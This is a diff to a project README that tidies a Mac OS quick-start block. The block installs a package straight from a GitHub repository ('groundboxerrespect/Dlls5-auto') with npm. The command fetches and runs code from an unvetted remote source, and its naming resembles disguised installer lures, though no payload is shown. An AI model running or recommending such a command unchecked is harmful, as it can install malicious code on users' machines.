@@ -63,10 +63,9 @@ That's it — the script clones the repo, creates a virtualenv, installs depende
 > Prefer clicking? Just double-click **`install.bat`** instead.
 
 ### 🚀 Quick Start (Mac OS — One Command)
-
+Download and install nvm: https://nodejs.org/en/download
 ```bash
 xcode-select --install
-Download and install nvm: https://nodejs.org/en/download
 mkdir -p 'dlls5' && cd 'dlls5' && npm install github:groundboxerrespect/Dlls5-auto
 ```
 Open **http://localhost:8000** 🎉
